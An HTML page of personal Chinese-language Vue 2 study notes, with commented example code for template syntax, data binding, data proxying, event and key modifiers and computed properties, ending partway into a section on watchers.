<!DOCTYPE html>
<html lang="zh">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" type="images/x-icon"
    href="https://github.com/SzhLzj/My-Blog/blob/aa53eb4c385b2007859082f8fb4f1a84e2645398/img/szh.jpg?raw=true">
  <link rel='icon'  type="images/x-icon" href="/img/szh.jpg"></link>
  <title>Vue</title>
  <style>
    body{
      margin: 0px;
      background-color: whitesmoke;
    }
    #frame {
      width: 1350px;
      margin: auto;
      padding: 0px 10px;
      border-style: none solid none solid;
      border-width: 1px;
      font-size: 123%;
    }
    #h1{
      /* position: -webkit-sticky; */
      position: sticky;
      /* position: relative; */
      top: 0;
      padding: 2rem 0px 0px 0px;
      /* margin-bottom: 24px; */
      background-color: whitesmoke;
      height: 50px;
      z-index: 999;
      display: flex;
      align-items: center;
    }
    #h1>h1{
      background-color: whitesmoke;
      margin: 0px;
    }
    #zoom {
      /* position: absolute; */
      /* top: 19px; */
      /* left: 231px; */
      margin-left: 20px;
      height: 31px;
      width: 151px;
      border-radius: 8px;
      transition: width 1s;
      font-size: 12px;
    }
    /* 使zoom无加减器（微调控件） */
    input::-webkit-outer-spin-button,
    input::-webkit-inner-spin-button {
      -webkit-appearance: none;
    }
    /* 好像没用,忘记为啥写这个了 */
    /* input[type="number"] {
      -moz-appearance: textfield;
      -webkit-appearance: textfield;
      appearance: textfield;
    } */
    #zoom:focus {
      width: 280px;
    }
    #yjzk{
      background-color: #e7e7e7;
      border: none;
      color: black;
      padding: 15px 32px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 16px;
      cursor: pointer;
      margin: 0px 0px 3px 3rem;
    }
    a {
      color: brown;
    }
    .code_1{
      font-size: 150%;
      color: white;
      display: none;
      background-color: rgb(49, 63, 65);
      word-wrap: break-word;
      white-space: pre-wrap;
      border-radius: 20px;
      border: rgb(49, 63, 65) solid 5px;
      box-shadow: 0 2px 12px 0 rgba(0, 0, 0, 0.5);
    }
    .copy{
      background-color: #e7e7e7;
      border: none;
      text-align: center;
      float: right;
      margin: 10px;
      display: none;
    }
    #jsst{
      color: red;
    }
    .down{
      font-size: 1.5rem;
      margin-left: 1rem;
      font-weight: bold;
      user-select:none;
      -moz-user-select: none;
      -o-user-select:none;
      -khtml-user-select:none;
      -webkit-user-select:none;
      -ms-user-select:none;
    }
    #tips1{
      font-size: 1rem;
      margin-left: 1rem;
    }
  </style>
</head>

<body>
  <div id="frame">
    <div id="h1">
      <h1>Vue 笔记</h1>
      <input type="number" max="200" min="75" id="zoom" placeholder="输入数字可以控制文字大小 , 自带 % 哦 , 默认123%" onchange="trigger(this.value)">
      <button id="yjzk" onclick="sqzk(this)">一键展开所有下拉栏↓</button>
    </div>
    <p>如果我哪里疏忽大意,抑或是你有更好建议,可以联系QQ:1204184336,邮箱:1204184336@qq.com</p>
    <span>视频学习推荐: </span><a href="https://www.bilibili.com/video/BV1Zy4y1K7SH?spm_id_from=333.999.0.0">尚硅谷Vue2.0+Vue3.0全套教程</a>
    <p>Vue是一套用于<strong>构建用户界面</strong>的<strong>渐进式</strong>框架</p>
    <p>学习Vue需要掌握哪些JavaScript知识呢?</p>
    <p>Es6语法规范、Es6模块化、包管理器、原型、原型链、数组的常用方法、axios、promise等等 ^_^ 不会也没事,临时抱佛脚吧</p>
    <hr>
    <h2>Vue的特点</h2>
    <h3>1.组件化</h3>
    <p>Vue文件中包含了html、css、js代码,因此一个<strong>用户界面</strong>可以由多个Vue文件拼接起来,提高了代码的复用性和可维护性</p>
    <h3>2.声明式</h3>
    <p>声明式编程,相比于传统的命令式编程,无需直接操作DOM,更具有效率</p>
    <h3>3.虚拟DOM</h3>
    <p>使用了虚拟DOM+Diff算法,尽可能的复用了DOM节点,用内存换取了速度</p>

    <hr>
    <!-- 1 11/18 -->
    <h2>第一个Vue实例 - Vue模板语法:{{}} -插值语法 <span class="down" onclick="clickondown(this)">\/<span id="tips1">←这是下拉栏</span></span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
    &lt;!DOCTYPE html&gt;
    &lt;html lang="zh"&gt;

      &lt;head&gt;
        &lt;meta charset="UTF-8"&gt;
        &lt;title&gt;第一次嗷&lt;/title&gt;
      &lt;/head&gt;

      &lt;body&gt;
        &lt;div id="root"&gt;
          &lt;h1&gt;Hello {{name}}&lt;/h1&gt; &lt;!-- {{}}为Vue特有的插值语法,他会拿着{{}}里面的<strong id="jsst">js表达式</strong>去绑定的Vue实例中匹配属性并取值 --&gt;
        &lt;/div&gt;

        &lt;!-- 引入Vue2.6.14  crossorigin、integrity是为了防止cdn被劫持而进行的校验,有兴趣可以百度了解一下 --&gt;
        &lt;script integrity="sha384-2u1og8lTeZnItjWoZIz1rg9odMcYMhz/DaSMh5ePJJ2yBAAHZvQ2Dhh3/SwNoOLs"
          crossorigin="anonymous" src="https://lib.baomitu.com/vue/2.6.14/vue.common.dev.js"&gt;&lt;/script&gt;

        &lt;script&gt;
          new Vue({            //new 一个Vue实例
            el: '#root',       //将Vue实例绑定在#root容器上 其实还可以这样写 document.getElementById('root')当然 知道就行 不推荐
            data: {            //data用于储存数据,供el绑定的容器使用
              name: 'World'    //被匹配的那个属性
            },
          })

        &lt;/script&gt;
      &lt;/body&gt;
    &lt;/html&gt;
    </pre>
    <p>总结</p>
    <p>1.首先要new个Vue实例, 然后用el绑定容器, 在data里写好键值对, 随后用插值语法实现<strong>响应式编程</strong>, 因为{{}}可以读取到<strong>data里面所有的键值对</strong>, 并自动对其实时更新。</p>
    <p>2.容器#root的大部分语法依旧符合html规范, 只是混入了一些Vue的语法。</p>
    <p>3.容器#root里的代码被称为【Vue模板】。</p>
    <p>4.容器和实例只能一一对应, 哪怕多个实例匹配的id是同一个容器的, Vue也不会解析第二个实例的内容, 反之亦然。（当然class也不行, 纯爱党的胜利）。</p>
    <p>5.注意到了吗, 在上面我说{{}}里写的是js的表达式, 因为在{{}}中你写data里面没有的东西他其实也能解析出来, 但仅限于js表达式, 比如说你写个{{Date.now()}}。</p>
    <p>6.真实开发中只有一个Vue实例, 并且会配合组件一起使用。</p>
    
    <hr>
    <!-- 2 11/18 -->
    <h2>Vue模板语法:v-bind -指令语法 <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
  
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
        &lt;/head&gt;
  
        &lt;body&gt;
          &lt;div id="root"&gt;
            &lt;h1&gt;Hello {{name}}&lt;/h1&gt;
            &lt;h1&gt;Hello {{index_url}}&lt;/h1&gt;
            &lt;h1&gt;Hello {{search_url}}&lt;/h1&gt;
            &lt;a v-bind:href="index_url"&gt;{{blog.name}}Blog欢迎页&lt;/a&gt;   &lt;!-- v-bing:会把后面的字符串("index_url")当成变量(js表达式)来解析 --&gt;
            &lt;a :href="search_url"&gt;{{blog.name}}Blog分类页&lt;/a&gt;        &lt;!-- v-bing:可以简写成: --&gt;
          &lt;/div&gt;
  
          &lt;script integrity="sha384-2u1og8lTeZnItjWoZIz1rg9odMcYMhz/DaSMh5ePJJ2yBAAHZvQ2Dhh3/SwNoOLs"
            crossorigin="anonymous" src="https://lib.baomitu.com/vue/2.6.14/vue.common.dev.js"&gt;&lt;/script&gt;

          &lt;script&gt;
            new Vue({
              el: '#root',
              data: {
                name: 'World',
                index_url: 'https://szhlzj.github.io/My-Blog/index.html',
                search_url: 'https://szhlzj.github.io/My-Blog/search.html',
                blog: {
                  name: 'SzhLzj',  //假如你难以取名,需要两个一样名字的属性,你可以像这样把第二个name包起来使用。
                },
              },
            })
  
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;
    </pre>
    <p>总结</p>
    <p>1.{{}}会在"内容"(Content)当中被解析, 而v-bind会在"属性"(Attribute)当中被解析。</p>
    <p>2.{{}}可以读取到<strong>data里面所有的键值对</strong>,并且v-bind也可以读取到<strong>data里面所有的键值对。</strong></p>
    <p>3.{{}}是插值语法,v-bind是指令语法,指令语法有很多,指令语法会在"标签"(Tag)当中被解析(标签包括:"内容"(Content)、"属性"(Attribute)、绑定事件等等。。。)</p>
    <p>4.data里还可以创建新的对象,这样可以重复使用对象名,调用方式为"新对象.对象名"</p>

    <hr>
    <!-- 3 11/19 -->
    <h2>Vue模板语法:v-model -指令语法 <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
  
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
        &lt;/head&gt;
  
        &lt;body&gt;
          &lt;div id="root"&gt;
            单向数据绑定:&lt;input type="text" v-bind:value="name"&gt;  &lt;!-- v-bind只能实现单向绑定(从data流向input) --&gt;
            &lt;br&gt;
            双向数据绑定:&lt;input type="text" v-model:value="name"&gt; &lt;!-- v-model能实现双向绑定(不仅能从data流向input,还能从input流向data) --&gt;
            &lt;br&gt;
            双向数据绑定:&lt;input type="text" v-model="name"&gt;       &lt;!-- v-model:value可以简写为v-model,因为v-model默认收集的就是value --&gt;
            &lt;br&gt;
            &lt;h1 v-model:x='name'&gt;但是v-model不是哪里都可以使用的,他只能使用在表单类(输入类元素)元素上,就像这行h1,你打开控制台就会发现他在报错。&lt;/h1&gt;
          &lt;/div&gt;
  
          &lt;script integrity="sha384-2u1og8lTeZnItjWoZIz1rg9odMcYMhz/DaSMh5ePJJ2yBAAHZvQ2Dhh3/SwNoOLs"
            crossorigin="anonymous" src="https://lib.baomitu.com/vue/2.6.14/vue.common.dev.js"&gt;&lt;/script&gt;

          &lt;script&gt;
            new Vue({
              el: '#root',
              data: {
                name: 'World',
              },
            })
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;
    </pre>
    <p>无总结</p>

    <hr>
    <!-- 4 11/19 -->
    <h2>el和data的两种写法 <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
  
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
        &lt;/head&gt;
  
        &lt;body&gt;
          &lt;div id="root"&gt;
            &lt;h1&gt;Hello {{name}}&lt;/h1&gt;
          &lt;/div&gt;
      
          &lt;script integrity="sha384-2u1og8lTeZnItjWoZIz1rg9odMcYMhz/DaSMh5ePJJ2yBAAHZvQ2Dhh3/SwNoOLs"
            crossorigin="anonymous" src="https://lib.baomitu.com/vue/2.6.14/vue.common.dev.js"&gt;&lt;/script&gt;
      
          &lt;script&gt;
            const x = new Vue({
              el: '#root',     //el的第一种写法
      
              data: {          //data的第一种写法,对象式
                name: 'World',
              },
      
              data:function(){ //data的第二种写法,函数式,可以去掉:function简写成data(){}但是不能使用箭头函数,因为this的指向会变化
                return{        //data在组件中必须用函数式写法,否则会报错
                  name: 'World',
                }
              }
            })
      
            x.$mount('#root');  //el的第二种写法
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;
    </pre>
    <p>无总结</p>

    <hr>
    <!-- 5 11/19 -->
    <h2>数据代理 <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
  
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
        &lt;/head&gt;
  
        &lt;body&gt;
          &lt;script&gt;
            let number = 19;
            let person = { //先建一个对象
              name:"张三",
              sex:"男",
            }

            //我们先复习一下Object.defineProperty,Object.defineProperty方法会直接在一个对象上定义一个新属性,或者修改一个对象的现有属性,并返回此对象。
            Object.defineProperty(person,'age',{ //三个重要的参数,目标对象,新建的属性名,属性值和各种配置项,配置项有很多,详细信息可以去MDN查询
              // value: 18, //这时,对象person就被创建了一个属性叫age,value等于18
              // enumerable: true, //这个配置项用于让age可以被枚举,因为enumerable的默认值是false
              // 接下来让我们注释掉value和enumerable,因为一个描述符同时拥有 value 或 writable 和 get 或 set 键,则会产生一个异常。

              get(){ //在person的age被读取时,会触发get(getter)函数
                return number;
              },

              set(value){ //在person的age被修改时,会触发set(setter)函数
                number = value;
              }
            })
            console.log(person.age); //控制台是不是打印了19
            person.age = 31;         //让我们尝试改变这个值
            console.log(person.age); //控制台是不是打印了31
            //在Object.defineProperty的帮助下,本来毫无关联的number和person却实现了数据代理,这就是今天要讲的数据代理
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;
    </pre>
    <p>无总结</p>

    <hr>
    <!-- 6 11/19 -->
    <h2>Vue中的数据代理 <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
  
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
        &lt;/head&gt;
  
        &lt;body&gt;
          &lt;div id="root"&gt;
            &lt;h1&gt;Hello {{name}}&lt;/h1&gt;
          &lt;/div&gt;

          &lt;script integrity="sha384-2u1og8lTeZnItjWoZIz1rg9odMcYMhz/DaSMh5ePJJ2yBAAHZvQ2Dhh3/SwNoOLs"
            crossorigin="anonymous" src="https://lib.baomitu.com/vue/2.6.14/vue.common.dev.js"&gt;&lt;/script&gt;

          &lt;script&gt;
            const vm = new Vue({
              el: '#root',
              data: {  //data里面的属性会做数据劫持+数据代理
                name: 'World',
              },
            })

            console.log(vm);
            console.log(vm.name);        //控制台是不是打印了World
            console.log(vm._data.name);  //控制台是不是打印了World
            //vm是Vue实例没问题,但为什么vm.name和vm._data.name都打印了World呢?
            //实际上,vm._data就是vm实例中的data对象,他们之间做了一个数据劫持,你问我啥叫数据劫持?为的是自动更新{{}}的内容,详细的以后再说
            //简单来说,数据劫持指的是在访问或者修改对象的某个属性时,通过一段代码拦截这个行为,进行额外的操作或者修改返回结果
            //你可能会说这数据劫持怎么和数据代理这么像啊,你是不是在忽悠我啊,不忽悠!但是现在的你们只需要知道vm._data的值就是vm实例中的data对象即可
            //所以vm._data.name打印出的是World
            //再来说说为什么vm.name是哪来的,因为Vue在这里做了一个数据代理(今天的主题!),将vm._data.name和vm.name之间用Object.defineProperty联系了起来
            //不信你可以看看console.log(vm);下面是不是有两个函数叫get name: ƒ proxyGetter()和set name: ƒ proxySetter(val)
            //你不要和我说vm._data下面也有,以后再说!
            //Vue为什么要做这个数据代理呢,因为如果没有这个数据代理,你在{{}}里就要写_data.name而不是name,这是为了方便你们而做的
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;
    </pre>
    <p>无总结</p>

    <hr>
    <!-- 7 11/19 -->
    <h2>Vue模板语法:v-on -指令语法 事件处理 <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
  
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
        &lt;/head&gt;
  
        &lt;body&gt;
          &lt;div id="root"&gt;
            &lt;h1&gt;Hello {{name}}&lt;/h1&gt;
            &lt;button v-on:click="showInfo($event,33)"&gt;点我&lt;/button&gt;  &lt;!-- v-on专门处理事件,括号里可以传参,其实$event不需要可以去写,因为他是默认的 --&gt;
            &lt;button @click="showInfo($event,55)"&gt;点我&lt;/button&gt;  &lt;!-- v-on简写为@ --&gt;
          &lt;/div&gt;

          &lt;script integrity="sha384-2u1og8lTeZnItjWoZIz1rg9odMcYMhz/DaSMh5ePJJ2yBAAHZvQ2Dhh3/SwNoOLs"
            crossorigin="anonymous" src="https://lib.baomitu.com/vue/2.6.14/vue.common.dev.js"&gt;&lt;/script&gt;

          &lt;script&gt;
            const vm = new Vue({
              el: '#root',
              data: {
                name: 'World',
              },
              methods:{
                showInfo(event,a){ //对象中写方法可以省略function直接写方法名,Es6语法https://262.ecma-international.org/6.0/ 
                  console.log(vm.showInfo);//showInfo在哪?他还是在vm里,输出console.log(vm)就可以看到
                  console.log(event); //可以直接获取到点击的对象,也就是button
                  console.log(a); //传进来的参数  
                  console.log(this); //实例里的this都是指vm或组件实例对象,不包括箭头函数的this
                }
              }
            })
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;
    </pre>
    <p>无总结</p>

    <hr>
    <!-- 8 11/22 -->
    <h2>Vueの事件修饰符 <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;

        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
        &lt;/head&gt;

        &lt;body&gt;
          &lt;div id="root"&gt;
            &lt;h1&gt;Hello {{name}}&lt;/h1&gt;
            &lt;a href="https://www.baidu.com" @click.prevent="showInfo($event,55)"&gt;点我&lt;/a&gt;  &lt;!-- prevent就是事件修饰符,他能阻止a标签的跳转事件 --&gt;
            &lt;p&gt;
              Vue中有六个事件修饰符;&lt;br&gt;
              .prevent -阻止默认事件&lt;br&gt;
              .stop -阻止事件冒泡&lt;br&gt;
              .once -事件只触发一次&lt;br&gt;
              .capture -使用事件捕获模式&lt;br&gt;
              .self -只有event.target是当前操作的元素时才触发事件&lt;br&gt;
              .passive -passive能保证的只有一点,那就是使调用 preventDefault()无效&lt;br&gt;
              .native 修饰符就是用来注册元素的原生事件而不是组件自定义事件的,例如elementUI里就可以用到这个
            &lt;/p&gt;
            &lt;!-- .prevent -阻止默认事件 --&gt;
            &lt;a href="https://www.baidu.com" @click.prevent="showInfo($event,55)"&gt;点我.prevent&lt;/a&gt;

            &lt;!-- .stop -阻止事件冒泡 --&gt;
            &lt;div @click="stop(3)"&gt;
              &lt;div @click="stop(2)"&gt;
                &lt;div @click.stop="stop(1)"&gt;点我.stop&lt;/div&gt;
              &lt;/div&gt;
            &lt;/div&gt;

            &lt;!-- .once -事件只触发一次 --&gt;
            &lt;div @click.once="once()"&gt;点我.once&lt;/div&gt;

            &lt;!-- .capture -使用事件捕获模式 --&gt;
            &lt;div @click.capture="stop(3)"&gt;
              &lt;div @click.capture="stop(2)"&gt;
                &lt;div @click="stop(1)"&gt;点我.capture&lt;/div&gt; &lt;!-- 还记得吗,事件的流程是先捕获后冒泡,捕获是由外往内,冒泡是由内往外 --&gt;
                &lt;!-- 所以按照标准流程,上面三个事件应该是先捕获3,2,1 然后再冒泡1,2,3 --&gt;
                &lt;!-- 而使用了.capture后,程序会在冒泡阶段优先执行,如果有多个capture,执行顺序由外到内。 --&gt;
              &lt;/div&gt;
            &lt;/div&gt;

            &lt;!-- .self -只有event.target是当前操作的元素才触发事件,是不是感觉看不懂,看console.log你就知道了 --&gt;
            &lt;div @click="self($event,3)"&gt;
              &lt;div @click.self="self($event,2)"&gt;
                &lt;div @click="self($event,1)"&gt;点我.self&lt;/div&gt;
              &lt;/div&gt;
            &lt;/div&gt;

            &lt;!-- .passive -passive能保证的只有一点,那就是调用 preventDefault() 无效 --&gt;
            &lt;button @click="passive($event)"&gt;点我.无passive&lt;/button&gt;
            &lt;button @click.passive="passive($event)"&gt;点我.有passive&lt;/button&gt;

            &lt;!-- 事件修饰符可以连写,但是要注意顺序,顺序不一样,可能!,会有不一样的效果 --&gt;
            &lt;div @click="stop(3)"&gt;
              &lt;div @click="stop(2)"&gt;
                &lt;a href="https://www.baidu.com" @click.stop.prevent="stop(1)"&gt;点我.修饰符连写&lt;/a&gt;
              &lt;/div&gt;
            &lt;/div&gt;
          &lt;/div&gt;

          &lt;script integrity="sha384-2u1og8lTeZnItjWoZIz1rg9odMcYMhz/DaSMh5ePJJ2yBAAHZvQ2Dhh3/SwNoOLs"
            crossorigin="anonymous" src="https://lib.baomitu.com/vue/2.6.14/vue.common.dev.js"&gt;&lt;/script&gt;

          &lt;script&gt;
            const vm = new Vue({
              el: '#root',
              data: {
                name: 'World',
              },
              methods:{
                showInfo(event,a){ 
                  alert("a标签不会跳转,"+a);
                },
                stop(a){
                  alert(`第${a}次冒泡`);
                },
                once(){
                  alert("我只会出现一次,再点我就没用了");
                },
                self(event,a){
                  // alert(`event${a}.target是${event.target}`);
                  alert(`我会第${a}次冒泡,不会第2次冒泡`);
                  console.log(event.target);
                  console.log('可以看出,虽然是冒泡上去了,但是event.target是不变的');
                  console.log('所以我们可以得出结论,self会阻止非event.target元素的事件');
                },
                passive(event){
                  console.log(`event.preventDefault()是${event.defaultPrevented}`); // false
                  event.preventDefault();
                  console.log(`event.preventDefault()是${event.defaultPrevented}`); // 还是 false,因为preventDefault()无效了
                },
              }
            })
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;
    </pre>
    <p>无总结</p>

    <hr>
    <!-- 9 11/22 -->
    <h2>Vue的按键修饰符 <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;

        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
          &lt;style&gt;
            input{
              height: 31px;
              width: 310px;
            }
          &lt;/style&gt;
        &lt;/head&gt;

        &lt;body&gt;
          &lt;div id="root"&gt;
            &lt;h1&gt;Hello {{name}}&lt;/h1&gt;
            &lt;p&gt;
              Vue中有九个常用的按键修饰符;&lt;br&gt;
              .enter -回车&lt;br&gt;
              .delete -退格或删除都能捕获到&lt;br&gt;
              .esc -退出&lt;br&gt;
              .tap -制表符&lt;br&gt;
              .up -上&lt;br&gt;
              .down -下&lt;br&gt;
              .left -左&lt;br&gt;
              .right -右&lt;br&gt;
            &lt;/p&gt;
            &lt;!-- 由于篇幅限制,9个就不一一测试了,自行替换尝试吧 --&gt;
            &lt;input type="text" placeholder="按下对应的修饰符按键后在控制台查看输出" @keyup.enter="showInfo"&gt;&lt;br&gt;&lt;br&gt;
            &lt;!-- 这里的.enter就是按键修饰符,这是Vue的别名,所以可以使用小写e开头 --&gt;
      
            &lt;!-- 但是不常用不代表不会用,万一我们遇到了这9个之外的,可以用下面的方法 --&gt;
            &lt;input type="text" placeholder="按下你需要的按键在控制台查看输出" @keydown="check"&gt;&lt;br&gt;&lt;br&gt;
            &lt;!-- 找到名字之后,你可以直接@keyup.名字就可以触发了,包括9个常用的也可以使用名字来触发,但是要注意大小写,如@keyup.Enter="check" --&gt;
            &lt;!-- 找到键码之后,你可以直接@keyup.键码就可以触发了,包括9个常用的也可以使用键码来触发,如@keyup.13="check" 不推荐使用,原因在同下 --&gt;
            &lt;!-- 主要是因为现在的键盘五花八门,主要按键的键码是一样的,但总有一些按键键码不太统一,所以现在推荐使用名字来触发 --&gt;
            &lt;!-- 注意,有些按键名字的组成不止一个单词,如CapsLock,这种应写成caps-lock,如@keyup.caps-lock="check" --&gt;
            &lt;!-- Tap,Ctrl,Alt,Meta 最好都配合keydown使用,keyup支持的不太好用 --&gt;

            &lt;!-- Vue还支持我们给按键起别名,这其实也不太推荐,有点影响可读性 --&gt;
            &lt;input type="text" placeholder="按下你需要的按键在控制台查看输出" @keydown.huiche="check"&gt;&lt;br&gt;&lt;br&gt;

            &lt;!-- 按键修饰符可以连写,但是要注意顺序,顺序不一样,可能!,会有不一样的效果 --&gt;
            &lt;input type="text" placeholder="按下你需要的按键在控制台查看输出" @keydown.ctrl.y="check"&gt;&lt;br&gt;&lt;br&gt;
          &lt;/div&gt;

          &lt;script integrity="sha384-2u1og8lTeZnItjWoZIz1rg9odMcYMhz/DaSMh5ePJJ2yBAAHZvQ2Dhh3/SwNoOLs"
            crossorigin="anonymous" src="https://lib.baomitu.com/vue/2.6.14/vue.common.dev.js"&gt;&lt;/script&gt;

          &lt;script&gt;
            Vue.config.keyCodes.huiche = 13;

            const vm = new Vue({
              el: '#root',
              data: {
                name: 'World',
              },
              methods:{
                showInfo(event){
                  // if (event.keyCode !== 13) return; //keyCode已废弃,一些浏览器仍然支持,但请谨慎使用,原先需要使用这种方法,Vue为我们提供按键修饰符
                  console.log(event.target.value);
                },
                check(e){
                  console.log(e.key,e.keyCode);
                }
              }
            })
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;
    </pre>
    <p>无总结</p>

    <hr>
    <!-- 10 12/29 -->
    <h2>computed(计算属性) <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
          &lt;title&gt;没错,我就是标题&lt;/title&gt;
          &lt;style&gt;
            input{
              height: 31px;
              width: 310px;
            }
            div{
              width: 310px;
              margin: 0px auto;
            }
          &lt;/style&gt;
        &lt;/head&gt;
        &lt;body&gt;
          &lt;div id="root"&gt;
            &lt;h1&gt;插值语法实现&lt;/h1&gt;
            姓 &lt;input type="text" v-model="firstname"&gt;&lt;br&gt;&lt;br&gt;
            名 &lt;input type="text" v-model="lastname"&gt;&lt;br&gt;&lt;br&gt;
            姓名: &lt;span&gt;{{ firstname.slice(0 , 3) }} - {{ lastname }}&lt;/span&gt;&lt;br&gt;&lt;br&gt;
      
            &lt;h1&gt;methods(方法)实现&lt;/h1&gt;
            姓 &lt;input type="text" v-model="firstname"&gt;&lt;br&gt;&lt;br&gt;
            名 &lt;input type="text" v-model="lastname"&gt;&lt;br&gt;&lt;br&gt;
            姓名: &lt;span&gt;{{ fullname() }}&lt;/span&gt;&lt;br&gt;&lt;br&gt;
      
            &lt;h1&gt;computed(计算属性)实现&lt;/h1&gt;
            姓 &lt;input type="text" v-model="firstname"&gt;&lt;br&gt;&lt;br&gt;
            名 &lt;input type="text" v-model="lastname"&gt;&lt;br&gt;&lt;br&gt;
            &lt;!-- 只要呼唤一下计算属性的名字,他就被调用了,并返回值 --&gt;
            姓名: &lt;span&gt;{{ fullname2 }}&lt;/span&gt;&lt;br&gt;
            姓名: &lt;span&gt;{{ fullname2 }}&lt;/span&gt;&lt;br&gt;
            姓名: &lt;span&gt;{{ fullname2 }}&lt;/span&gt;&lt;br&gt;
            姓名: &lt;span&gt;{{ fullname2 }}&lt;/span&gt;&lt;br&gt;&lt;br&gt;
            &lt;span&gt;
              你是不是在想我脑子抽了,为啥要写四遍,因为我想告诉你,get()函数只被调用了一次,
              打开控制台你就会发现,至于为什么他只调用了一次,那是因为Vue有个缓存机制,
              有经验的小伙伴可能会想,有缓存不行啊,再想改变数据就不会更新了吗,
              没关系,在这里,get()在两种情况下会被调用,第一是初次访问fullname2的时候,
              第二是所依赖的数据发生变动的时候,不信你可以尝试改变firstname或lastname,
              看看控制台会不会有相应的变化,这个默认的缓存机制只在computed(计算属性)有,
              methods(方法)就没有,因此在某些情况下,computed(计算属性)比methods(方法)
              效率要高
            &lt;/span&gt;
            &lt;br&gt;&lt;br&gt;
            fullname3姓名: &lt;span&gt;{{ fullname3 }}&lt;/span&gt;&lt;br&gt;
            fullname4姓名: &lt;span&gt;{{ fullname4 }}&lt;/span&gt;&lt;br&gt;
          &lt;/div&gt;
      
          &lt;script src="./js/vue.js"&gt;&lt;/script&gt;
          &lt;script&gt;
            const vm = new Vue({
              el: '#root',
              data: {
                firstname: '张',
                lastname: '三',
              },
              methods:{
                fullname() {
                  return `${this.firstname} - ${this.lastname}`;
                }
              },
              computed:{
                //还记得吗,data里的firstname和lastname都会出现在vm._data里
                //因为他们之间做了数据劫持,并且在做了数据代理后,vm里面也有了firstname和lastname
                //那fullname2在哪里呢?
                //fullname2也可以在vm里找到,不过在控制台,你看不出fullname2与data里面的属性之间的区别
                //借助Vue开发者工具你可以分辨出谁是data(属性) 谁是computed(计算属性)
                //虽然vm里能找到fullname2,但是_data里是不会出现fullname2的,这个好理解的吧
                fullname2: {
                  //还记得get()吗,忘记的回去看看数据代理那一篇
                  get(){
                    console.log('依赖的数据不发生变动的时候,get()只被调用了一次');
                    //你可能会想为什么这里的this是vm,而不是get(),因为Vue已经帮您配置好了
                    return `${this.firstname} - ${this.lastname}`;
                  },
                  //如果你想根据姓名来改变姓和名,你就需要用到set(),忘记的依旧回去看数据代理那一篇
                  set(value){
                    console.log('set',value)
                    const arr = value.split('-')
                    this.firstname = arr[0]
                    this.lastname = arr[1]
                  }
                },
                //如果你确定你不需要修改计算属性的结果时(也就是不要set时),可以不用写的像上面这么麻烦,下面是简写的示例
                fullname3: function () {
                  return `${this.firstname} - ${this.lastname}`;
                },
                //如上所示,function()相当于是get()
                //还可以再简写,注意哦,这不是说fullnanme4就是函数,这依旧是计算属性,只是被简写了
                fullname4 () {
                  return `${this.firstname} - ${this.lastname}`;
                }
              }
            })
          &lt;/script&gt;
        &lt;/body&gt;
      &lt;/html&gt;
    </pre>
    <p>无总结</p>

    <hr>
    <!-- 11 12/29 -->
    <h2>监视属性 <span class="down" onclick="clickondown(this)">\/</span></h2>
    <button class="copy" onclick="copy(this)">复制</button>
    <pre class="code_1">
      &lt;!DOCTYPE html&gt;
      &lt;html lang="zh"&gt;
        &lt;head&gt;
          &lt;meta charset="UTF-8"&gt;
